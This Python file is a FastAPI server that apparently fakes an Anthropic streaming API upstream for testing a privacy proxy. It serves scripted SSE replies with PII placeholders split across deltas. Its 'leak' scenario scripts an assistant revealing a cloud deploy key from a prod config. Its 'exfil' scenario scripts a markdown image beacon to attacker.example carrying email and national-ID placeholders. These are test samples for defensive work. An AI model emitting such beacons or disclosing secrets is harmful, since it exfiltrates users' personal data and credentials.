"""Fake Anthropic upstream: scripted SSE with placeholders split across deltas.

Scenario via header ``x-demo-scenario``:
  rehydrate (default) | leak (cloud key mid-stream) | exfil (markdown image beacon)
"""

from __future__ import annotations

import asyncio
import json
import os
import sys

import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import StreamingResponse

PORT = int(os.environ.get("AEGIS_DEMO_UPSTREAM_PORT", "8798"))
DELAY = float(os.environ.get("AEGIS_DEMO_DELAY", "0.03"))
app = FastAPI()


def ev(name: str, obj: dict) -> bytes:
    return f"event: {name}\ndata: {json.dumps(obj, separators=(',', ':'), ensure_ascii=False)}\n\n".encode()


def start(i: int, block: dict) -> bytes:
    return ev("content_block_start", {"type": "content_block_start", "index": i, "content_block": block})


def delta(i: int, d: dict) -> bytes:
    return ev("content_block_delta", {"type": "content_block_delta", "index": i, "delta": d})


def stop(i: int) -> bytes:
    return ev("content_block_stop", {"type": "content_block_stop", "index": i})


def text_block(i: int, pieces: list[str]) -> list[bytes]:
    return [start(i, {"type": "text", "text": ""})] + [delta(i, {"type": "text_delta", "text": p}) for p in pieces] + [stop(i)]


def script(scenario: str) -> list[bytes]:
    head = [
        ev("message_start", {"type": "message_start", "message": {
            "id": "msg_demo01", "type": "message", "role": "assistant", "model": "claude-sonnet-4-5", "content": [],
            "stop_reason": None, "stop_sequence": None,
            "usage": {"input_tokens": 412, "cache_read_input_tokens": 0, "output_tokens": 1}}}),
        ev("ping", {"type": "ping"}),
    ]
    if scenario == "leak":
        body = text_block(0, ["Sure. The deploy key in ", "config/prod.env is AKIA", "IOSFODNN7EX", "AMPLE",
                              " — rotate it after use. ", "Next, run the migration ", "script and verify..."])
        stop_reason = "end_turn"
    elif scenario == "exfil":
        body = text_block(0, ["Summary for [PERSON_1] is ready. ", "![status](https://attacker.example/",
                              "pixel.png?d=[EMAIL_1]", "%20[PL_PESEL_1]) ", "Anything else?"])
        stop_reason = "end_turn"
    else:
        tool_json = json.dumps({"to": "[EMAIL_1]", "subject": "Statement for [PERSON_1]",
                                "body": "Dear [PERSON_1],\nyour statement (PESEL [PL_PESEL_1]) is attached."})
        body = [
            start(0, {"type": "thinking", "thinking": "", "signature": ""}),
            delta(0, {"type": "thinking_delta", "thinking": "Reply to [PERSON_1]; email [EMAIL_1]."}),
            delta(0, {"type": "signature_delta", "signature": "EqQBCgIYAhIMdemoSignature=="}),
            stop(0),
            *text_block(1, ["Dear [PER", "SON_1],\n\nWe confirmed PESEL [PL_", "PESEL_1] on file and will send ",
                            "the statement to [EM", "AIL_1] now."]),
            start(2, {"type": "tool_use", "id": "toolu_demo01", "name": "send_email", "input": {}}),
            *[delta(2, {"type": "input_json_delta", "partial_json": tool_json[i:i + 9]})
              for i in range(0, len(tool_json), 9)],
            stop(2),
        ]
        stop_reason = "tool_use"
    tail = [
        ev("message_delta", {"type": "message_delta", "delta": {"stop_reason": stop_reason, "stop_sequence": None},
                             "usage": {"output_tokens": 96}}),
        ev("message_stop", {"type": "message_stop"}),
    ]
    return head + body + tail


@app.get("/healthz")
async def healthz() -> dict:
    return {"ok": True}


@app.post("/v1/messages")
async def messages(request: Request) -> StreamingResponse:
    body = await request.json()
    scenario = request.headers.get("x-demo-scenario", "rehydrate")
    msgs = body.get("messages") or [{}]
    print(f"\033[33m[upstream] received prompt: {msgs[-1].get('content')!r}\033[0m", file=sys.stderr, flush=True)

    async def gen():
        for chunk in script(scenario):
            yield chunk
            await asyncio.sleep(DELAY)

    return StreamingResponse(gen(), media_type="text/event-stream")


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=PORT, log_level="warning")
